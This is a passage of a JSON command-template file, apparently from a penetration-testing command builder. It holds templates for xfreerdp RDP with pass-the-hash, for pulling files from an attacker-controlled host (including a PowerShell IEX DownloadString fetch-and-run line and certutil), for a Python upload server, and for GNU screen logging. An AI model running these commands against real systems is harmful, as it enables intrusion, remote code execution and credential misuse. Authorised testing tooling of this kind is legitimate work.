[
  {
    "id": "rdp",
    "keywords": ["rdp", "xfreerdp", "3389"],
    "cmds": [
      {
        "win": 0,
        "label": "XfreeRDP",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "xfreerdp /timeout:60000 /cert-ignore /compression /clipboard /dynamic-resolution /w:1280 /h:700 /port:__RDP_TARGET_PORT__ /v:__TARGET_HOST__ __DOMAIN_AUTH__ /u:'__USERNAME__' __PASSWORD_AUTH__ __SMB_SHARE_ENABLED__ __XFREERDP_ADMIN__ __XFREERDP_PROXY__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "Enter the username",
            "replace": "__USERNAME__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: Username"
            }
          },
          {
            "help": "Set the RDP Port to connect on, default 3389",
            "replace": "__RDP_TARGET_PORT__",
            "defaultValue": 3389,
            "props": {
              "type": "number",
              "label": "RDP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "Enable an SMB share to be served from the current working directory (eg, from kali). This share will be available to the RDP target host.",
            "replace": "__SMB_SHARE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable SMB Share in RDP session",
              "replaceValue": "/drive:share,__SMB_SHARE_CWD__"
            }
          },
          {
            "help": "XfreeRDP can share a local folder (local to the RDP client machine aka local to the machine connecting to the RDP server aka local to the attacking machine, kali). This SMB share will be available while the RDP session is connected. This allows for quick and easy upload/download of data (from the RDP server to kali) while in the RDP session without a complicated setup. Default is to include the current working directory (. period). Alternatively supply a path to another folder to share.",
            "replace": "__SMB_SHARE_CWD__",
            "defaultValue": ".",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "SMB Shared directory path (on Kali)"
            }
          },

          {
            "help": "Enable the DOMAIN flag to specify which DOMAIN for authentication",
            "replace": "__DOMAIN_AUTH__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable DOMAIN auth",
              "replaceValue": "/d:'__DOMAIN__'"
            }
          },
          {
            "help": "Enter the auth DOMAIN",
            "replace": "__DOMAIN__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: DOMAIN"
            }
          },
          {
            "help": "Select password authentication (plaintext creds or NTLM password hash aka pass-the-hash)",
            "replace": "__PASSWORD_AUTH__",
            "defaultValue": "/p:'__PASSWORD__'",
            "props": {
              "type": "radio",
              "label": "Select password auth method",
              "options": [
                {
                  "replace": "/p:'__PASSWORD__'",
                  "label": "Enable password authentication"
                },
                {
                  "replace": "/pth:'__PASSWORD_HASH__'",
                  "label": "Enable pass-the-hash authentication"
                }
              ]
            }
          },
          {
            "help": "Password as plaintext",
            "replace": "__PASSWORD__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: Password (plaintext)"
            }
          },
          {
            "help": "NTLM Password Hash as plaintext",
            "replace": "__PASSWORD_HASH__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: NTLM Password Hash (pth)"
            }
          },

          {
            "help": "Enable the 'admin' session",
            "replace": "__XFREERDP_ADMIN__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable /admin (or console) session",
              "replaceValue": "/admin"
            }
          },
          {
            "help": "Enable use of a proxy for the RDP connection to connect via (/proxy:[<proto>://][<user>:<password>@]<host>:<port>). NOTE: DO NOT USE WITH PROXYCHAINS",
            "replace": "__XFREERDP_PROXY__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable proxy flags",
              "replaceValue": "/proxy:'__XFREERDP_PROXY_PROTO__://__XFREERDP_PROXY_AUTH____XFREERDP_PROXY_HOST__:__XFREERDP_PROXY_PORT__'"
            }
          },
          {
            "help": "Select the proxy protocol to utilize, xfreerdp default is http",
            "replace": "__XFREERDP_PROXY_PROTO__",
            "defaultValue": "http",
            "props": {
              "type": "select",
              "label": "Proxy Protocol",
              "customInput": false,
              "options": ["http", "socks5"]
            }
          },
          {
            "help": "Proxy BASIC authentication. Format is 'USERNAME:PASSWORD@' (separate username and password with colon ending with an @). Default is blank",
            "replace": "__XFREERDP_PROXY_AUTH__",
            "defaultValue": "USERNAME:PASSWORD@",
            "validationRegex": "^[^:@]+:[^@]+@$",
            "validationHelp": "Format: USERNAME:PASSWORD@",
            "props": {
              "type": "string",
              "label": "Proxy Auth"
            }
          },
          {
            "help": "Proxy hostname or ipv4. default localhost",
            "replace": "__XFREERDP_PROXY_HOST__",
            "defaultValue": "localhost",
            "props": {
              "type": "string",
              "label": "Proxy Hostname or IPv4"
            }
          },
          {
            "help": "Proxy port. Default 1080",
            "replace": "__XFREERDP_PROXY_PORT__",
            "defaultValue": 1080,
            "props": {
              "type": "number",
              "label": "Proxy Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          }
        ]
      }
    ]
  },
  {
    "id": "http-download",
    "keywords": [
      "download",
      "http",
      "curl",
      "iwr",
      "get",
      "80",
      "8080",
      "certutil"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Powershell iwr",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "help": "",
        "cmd": "iwr http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -outfile __FILE__"
      },
      {
        "win": 0,
        "label": "Powershell iex",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "help": "",
        "cmd": "IEX(New-Object System.Net.WebClient).DownloadString('http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__')"
      },
      {
        "win": 0,
        "label": "curl Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "help": "",
        "cmd": "curl __EXTRA_CURL_LINUX_FLAGS__ -m __TIMEOUT_SEC__ -L http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -o __FILE__",
        "config": [
          {
            "help": "Set the curl timeout in seconds before the command will stop and return back to the terminal, irrespective if the download was finished or not. Default is around 120 seconds.",
            "replace": "__TIMEOUT_SEC__",
            "defaultValue": 10,
            "props": {
              "type": "number",
              "label": "Timeout Seconds",
              "InputProps": {
                "inputProps": {
                  "min": 0,
                  "max": 300
                }
              }
            }
          },
          {
            "help": "Enter any extra flags for this CURL command, default blank (none)",
            "replace": "__EXTRA_CURL_LINUX_FLAGS__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Extra Curl Flags"
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "CertUtil.exe Windows",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "help": "",
        "cmd": "certutil.exe -urlcache -split -f __ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ __FILE__",
        "code": []
      },
      {
        "win": 0,
        "label": "curl Windows",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "help": "",
        "cmd": "curl -OL http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__",
        "code": []
      },
      {
        "win": 1,
        "label": "python custom http server",
        "platform": "linux|windows",
        "terminal": ["ps", "cmd", "sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "help": "",
        "cmd": "python custom_server.py __CUSTOM_HTTP_SERVER_PORT__",
        "code": [
          {
            "filename": "custom_server.py",
            "data": "aW1wb3J0IGh0dHAuc2VydmVyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBwYXJzZV9xcywgdXJscGFyc2UKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBvcy5wYXRoCiMgaW1wb3J0IGpzb24KCmRlZiBtYWluKFBPUlQpOgogICAgY2xhc3MgQ3VzdG9tSFRUUFJlcXVlc3RIYW5kbGVyKGh0dHAuc2VydmVyLlNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CiAgICAgICAgCiAgICAgICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICAgICAgIyBEZWJ1ZyB0aGUgR0VUIHJlcXVlc3QgcGFyYW1ldGVycwogICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJscGFyc2Uoc2VsZi5wYXRoKQogICAgICAgICAgICBwYXJhbWV0ZXJzID0gcGFyc2VfcXMocGFyc2VkX3VybC5xdWVyeSkKICAgICAgICAgICAgcHJpbnQoIj09PUdFVD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3BhcnNlZF91cmwucGF0aH1cblBhcmFtZXRlcnM6IHtwYXJzZWRfdXJsLnF1ZXJ5fSIpCgogICAgICAgICAgICByZXF1ZXN0ZWRfcGF0aCA9IHNlbGYudHJhbnNsYXRlX3BhdGgoc2VsZi5wYXRoKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyZXF1ZXN0ZWRfcGF0aCk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXUiLCAibm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXQiLCAiNjAwMCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9kb2N1bWVudC1zYXZlLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIyMDAgLSBGaWxlIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsibm90aWZ5LXNlbmQiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdSIsICJub3JtYWwiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnLWknLCAiL3Vzci9zaGFyZS9pY29ucy9nbm9tZS80OHg0OC9hY3Rpb25zL3Byb2Nlc3Mtc3RvcC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYiR0VUIHtwYXJzZWRfdXJsLnBhdGh9IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiNDA0IC0gTk9UIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKCiAgICAgICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeSwgc2VydmUgaXQsIG90aGVyd2lzZSBzZW5kIGEgNDA0LgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdXBlcigpLmRvX0dFVCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KGYiZXJyb3IgZW5jb3VudGVyZWQgd2hpbGUgc2VydmluZzoge3BhcnNlZF91cmwucGF0aH0iKQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJub3RpZnktc2VuZCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi10IiwgIjYwMDAiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICctaScsICIvdXNyL3NoYXJlL2ljb25zL2dub21lLzQ4eDQ4L2FjdGlvbnMvcHJvY2Vzcy1zdG9wLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICI1MDAgLSBJbnRlcm5hbCBFcnJvciIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pCgogICAgICAgIGRlZiBkb19QT1NUKHNlbGYpOgogICAgICAgICAgICAjIGZvciBmaWxlIHVwbG9hZHMsIGV4cGVjdCBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0gYW5kIC91cGxvYWQgcm91dGUKICAgICAgICAgICAgaWYgc2VsZi5wYXRoLmxvd2VyKCkgPT0gJy91cGxvYWQnOgogICAgICAgICAgICAgICAgcHJpbnQoJ2ZpbGUgdXBsb2FkJykKCiAgICAgICAgICAgICAgICBjb250ZW50X2xlbmd0aCA9IGludChzZWxmLmhlYWRlcnNbJ0NvbnRlbnQtTGVuZ3RoJ10pCiAgICAgICAgICAgICAgICBib2R5ID0gc2VsZi5yZmlsZS5yZWFkKGNvbnRlbnRfbGVuZ3RoKQoKICAgICAgICAgICAgICAgICMgVE9ETzogcmFuZG9taXplIHRoaXMgZmlsZW5hbWUgaW4gdGhlIHRtcC8gZm9sZGVyCiAgICAgICAgICAgICAgICAjIFRPRE86IGVuc3VyZSB0aGUgdG1wIGZvbGRlciBleGlzdHMgd2hlbiBzdGFydGluZyB0aGlzIHNjcmlwdAogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gJ3RtcC91cGxvYWQxLmZpbGUnCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnd2InKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoYm9keSkKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQnKQoKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIGZvciBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQgb3IgbXVsdGlwYXJ0L2Zvcm0tZGF0YSBhdCBhbnkgcm91dGU6CiAgICAgICAgICAgICAgICAjIERlYnVnIHRoZSBQT1NUIHJlcXVlc3QgYm9keQogICAgICAgICAgICAgICAgY29udGVudF9sZW5ndGggPSBpbnQoc2VsZi5oZWFkZXJzLmdldCgnQ29udGVudC1MZW5ndGgnKSkKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSA9IHNlbGYucmZpbGUucmVhZChjb250ZW50X2xlbmd0aCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgQXNzdW1pbmcgUE9TVCBkYXRhIGlzIHNlbnQgYXMgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcgb3IgJ211bHRpcGFydC9mb3JtLWRhdGEnCiAgICAgICAgICAgICAgICAjcG9zdF92YXJzID0gcGFyc2VfcXMocG9zdF9kYXRhLmRlY29kZSgndXRmLTgnKSwga2VlcF9ibGFua192YWx1ZXM9VHJ1ZSkKICAgICAgICAgICAgICAgIHByaW50KCI9PT1QT1NUPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3NlbGYucGF0aH1cbkJvZHk6IHtwb3N0X2RhdGF9IikKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgICMgUHJvdmlkZSBhIHJlc3BvbnNlIHRvIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQgYW5kIGxvZ2dlZC4nKQoKICAgIHdpdGggaHR0cC5zZXJ2ZXIuSFRUUFNlcnZlcigoJycsIFBPUlQpLCBDdXN0b21IVFRQUmVxdWVzdEhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KGYiU2VydmluZyBhdCBwb3J0IHtQT1JUfSIpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlN0YXJ0IGFuIEhUVFAgc2VydmVyIG9uIGEgc3BlY2lmaWMgcG9ydC4iKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgncG9ydCcsIHR5cGU9aW50LCBoZWxwPSJQb3J0IHRvIHN0YXJ0IHRoZSBIVFRQIHNlcnZlciBvbiIpCiAgICBhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQoKICAgIHRyeToKICAgICAgICBtYWluKGFyZ3MucG9ydCkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5DbG9zaW5nIHNlcnZlci4uLiIpCgo=",
            "sha256": "0373a699442f2b49399d92455a5c7ff605d653d9b8e01750d2781dede0932d02"
          }
        ],
        "config": [
          {
            "help": "Set the HTTP server port",
            "replace": "__CUSTOM_HTTP_SERVER_PORT__",
            "defaultValue": 8081,
            "props": {
              "type": "number",
              "label": "Custom HTTP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          }
        ]
      },
      {
        "win": 1,
        "label": "Python3 -m http.server",
        "platform": "linux|windows",
        "terminal": ["ps", "cmd", "sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "help": "",
        "cmd": "python__PYTHON_BIN_3__ -m http.server __ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__ __CUSTOM_HTTP_SERVER_PORT__",
        "code": [],
        "config": [
          {
            "help": "Set the HTTP server port",
            "replace": "__CUSTOM_HTTP_SERVER_PORT__",
            "defaultValue": 8081,
            "props": {
              "type": "number",
              "label": "Custom HTTP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "On some systems the Python binary is differentiated from Python version 2 by naming it python3. This adds the 3 to the command string for you",
            "replace": "__PYTHON_BIN_3__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Python binary is named Python3",
              "replaceValue": "3"
            }
          },
          {
            "help": "Default is to host the webserver on all interfaces. There are times when it might be useful to only host it on a given interface and/or address. This option enables the flag to this.",
            "replace": "__ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable bind to specific ipv4 address",
              "replaceValue": "--bind __CUSTOM_HTTP_SERVER_BIND_ADDRESS__"
            }
          },
          {
            "help": "Enter the IPv4 Address to bind the python simple http server to",
            "replace": "__CUSTOM_HTTP_SERVER_BIND_ADDRESS__",
            "defaultValue": "__ATTACKER_HOST__",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Bind IPv4 Address"
            }
          }
        ]
      }
    ]
  },
  {
    "id": "terminal-multiplexer",
    "keywords": ["tmux", "screen"],
    "cmds": [
      {
        "win": 0,
        "label": "new_screen SESSION",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "new_screen __NEW_SCREEN_SESSION_NAME__",
        "help": "# Start a new session\n\nThis command will start a new screen session with the configured window splits, sizes, and logging turned on.\n\nThe logs are saved in the `current directory` with the filename pattern of `slog{SESSION_NAME}.{LOG_NUM}` where `SESSION_NAME` is the argument provided to the `new_screen SESSION_NAME` command, and the `LOG_NUM` is a number relating to the window split within the screen configuration eg `win 0 == slog*.0`\n\nBy default in this configuration, there are `6` window splits.\n\n## GNU Screen specifics:\n\n- [Screen Manual](https://www.gnu.org/software/screen/manual/screen.html#Resize)\n\n| Hotkey | Description |\n| --- | --- |\n| `Ctrl + a, ?` | Open Help Menu |\n| `Ctrl + a, Tab` | Focus the next window aka move cursor to next window |\n| `Ctrl + a, Shift + Tab` | Focus the previous window aka move cursor to previous window |\n| `Ctrl + a, \"` | show windows to select one. NOTE: (double quote) |\n| `Ctrl + a, S` | split horizontally --- NOTE: (capital S) |\n| `Ctrl + a, \\|` | split vertically \\| NOTE: (Pipe char) |\n| `Ctrl + a, c` | create a new window |\n| `Ctrl + a, A` | Rename window |\n\n> NOTE: `vim` like movements are enabled as a custom addition to the keyboard shortcuts to this `screen` config. This enables `Ctrl + a` with one of `h`, `j`, `k`, `l`, `t`, `b` to move to the window to the left, down, up, right, top or bottom\n\n> NOTE: additionally `Ctrl + t` is used to display the `screen` windows list, allowing changing of the terminal within the current window.\n\n## window focus moving like in vim\n```\nbind h focus left\nbind j focus down\nbind k focus up\nbind l focus right\nbind t focus top\nbind b focus bottom\n```\n\n### To add an nth screen window split:\n\n1. decide on a split direction, enter the scree command (start via keyboard shortcut of `Ctrl + a`) of  `:split`\n2. tab into new pane\n3. create a new window (see table of commands above)\n4. rename window (see table of commands above)\n5. NOTE: logging will be ON BY DEFAULT, this is intended\n",
        "code": [],
        "config": [
          {
            "help": "Enter the name for the gnu screen session.\n\nThis will also be used within the `slog` filenames which have a pattern of `slog{SESSION_NAME}.{LOG_NUMBER}` and will be output in the current directory.\n\nNOTE: this command does NOT check if logs exist already and could overwrite them. Supply a new `SESSION_NAME` for each run",
            "replace": "__NEW_SCREEN_SESSION_NAME__",
            "defaultValue": "session1",
            "validationRegex": ".{1,}",
            "validationHelp": "Session Name must be at least 1 character",
            "props": { "type": "string", "label": "Session Name" }
          }
        ]
      },
      {
        "win": 1,
        "label": "py_logs - search screen logs",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "py_logs __PYLOGS_SLOG_GLOB__ __PYLOGS_FIND_ENABLED__ __PYLOGS_INCLUDE_ENABLED__ __PYLOGS_EXCLUDE_ENABLED__ __PYLOGS_NO_COLOR__ __PYLOGS_UNIQUE_RESULTS_ENABLED__ __PYLOGS_FIND_CASESENSITIVE_ENABLED__",
        "help": "# py_logs - alias to `~/logs.py`\n\n`py_logs` is an alias to a custom python script that is expected to be located at `~/logs.py`\n\n`py_logs` will allow the user to view and search through the `slog{SESSION_NAME}.{LOG_NUM}` files. To determine which `slogs` to view or search, the required parameter for the logs glob is used. This parameter is used as a file glob and can be used to search through sub-folders for slog files as well.\n\n## Examples\n\nAs an example consider the following file structure:\n\n```bash\n# topic1/\n#     - logs/\n#          - slogs*.0\n#          - slogs*.1\n# topic2/\n#     - logs/\n#          - slogs*.*\n# topic13/\n#     - logs/\n#          - slogs*.*\n```\n\na valid `py_logs` command to view and search through all of these logs would be: `py_logs topic*/logs/slog`\nNOTE: the last `*` is automatically provided by `py_logs`\n\n`py_logs` default behavior is to show the commands from oldest to newest.\n\nThere are flags for things like `searching`, `excluding` results in the output, only `including` specific results in the output, only outputting `unique` commands and more.",
        "code": [],
        "config": [
          {
            "help": "Glob to indicate where the `slog` files are located. This is a required parameter.\n\nThis parameter will have a glob '*' (asterisk) automatically appended at the end to find all files matching the pattern at the path provided. This allows for `py_logs` to use multiple `slog` files to get the content from them.\n\nBe as specific as you need to get back the results necessary.\n\nEg, a glob of `slogSession1test.0` will likely only match a single file, while `slogSession` will likely match a much larger set of files, giving a much large amount of output.",
            "replace": "__PYLOGS_SLOG_GLOB__",
            "defaultValue": "./slogsession1.",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "path to slog{SESSION_NAME} log files"
            }
          },
          {
            "help": "When enabled, this will only return unique commands from all logs provided. The default behavior is to always sort the output with the newest run commands being at the end of the output.",
            "replace": "__PYLOGS_UNIQUE_RESULTS_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable unique results ",
              "replaceValue": "-u"
            }
          },
          {
            "help": "Enable the find flag for `py_logs` alias command (~/logs.py)\n\nThis will then allow for finding of a string within the logs in either the `command ran` or the `results of command ran` or `both`.",
            "replace": "__PYLOGS_FIND_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable find flag",
              "replaceValue": "-f '__PYLOGS_FIND_SEARCH_TERM__' __PYLOGS_FIND_WHERE_ENABLED__"
            }
          },
          {
            "help": "enter a command or some text that might be in the logs. When ran, this will search the given logs and try to find the given value.",
            "replace": "__PYLOGS_FIND_SEARCH_TERM__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "What to find with py_logs" }
          },
          {
            "help": "Inclusion allows for sniping out returned values (displayed as `steps`) from the results of the logs. This allows the user to provide a string that matches the pattern of `'n-'` or `'n-i'` or multiple ranges via `'n-i,m,o,p-q'`.\n\n\nThis will include anything that matches the indices provided, or their ranges.\n\n> NOTE: If no number is provided after a hyphen, then the range will match all values from n up.",
            "replace": "__PYLOGS_INCLUDE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the include flag",
              "replaceValue": "-i '__PYLOGS_INCLUDE_RANGE__'"
            }
          },
          {
            "help": "See help for Enabling the include flag. Default `'0-'` aka include all indices in all logs provided",
            "replace": "__PYLOGS_INCLUDE_RANGE__",
            "defaultValue": "0-",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "include range" }
          },
          {
            "help": "Exclude a range of indices from the output, this will shorten the output. The range can be from one number to another, or open ended (eg, 0-). Or comma separate various ranges to exclude specific commands. See Enable include flag help for more info.",
            "replace": "__PYLOGS_EXCLUDE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the exclude flag",
              "replaceValue": "-x '__PYLOGS_EXCLUDE_RANGE__'"
            }
          },
          {
            "help": "See help for Enabling the exclude flag. Default '1-' aka exclude all but the first (0th) index",
            "replace": "__PYLOGS_EXCLUDE_RANGE__",
            "defaultValue": "1-",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "exclude range" }
          },
          {
            "help": "Much like other Linux/Unix commands, disabling color output is an optional flag. This will disable the color output for the py_logs alias of ~/logs.py",
            "replace": "__PYLOGS_NO_COLOR__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the --no-color flag",
              "replaceValue": "--no-color"
            }
          },
          {
            "help": "Case sensitive searching enables being even more specific with the searched term. The default is case-insensitive search.",
            "replace": "__PYLOGS_FIND_CASESENSITIVE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable Case Sensitive searching for the provided search term",
              "replaceValue": "--case"
            }
          },
          {
            "help": "Where flag will allow for searching in the logs for command results that match the search term, or in the commands only or in both (aka all)",
            "replace": "__PYLOGS_FIND_WHERE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "enable selecting where to search for the given search term to find.",
              "replaceValue": "--where '__PYLOGS_FIND_WHERE_OPTION__'"
            }
          },
          {
            "help": "See help for the checkbox that enables this feature to the left",
            "replace": "__PYLOGS_FIND_WHERE_OPTION__",
            "defaultValue": "all",
            "props": {
              "type": "select",
              "label": "Select an option for where to search for the term provided",
              "customInput": false,
              "options": ["all", "cmd", "result"]
            }
          }
        ]
      },
      {
        "win": 2,
        "label": "setup custom GNU screen",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
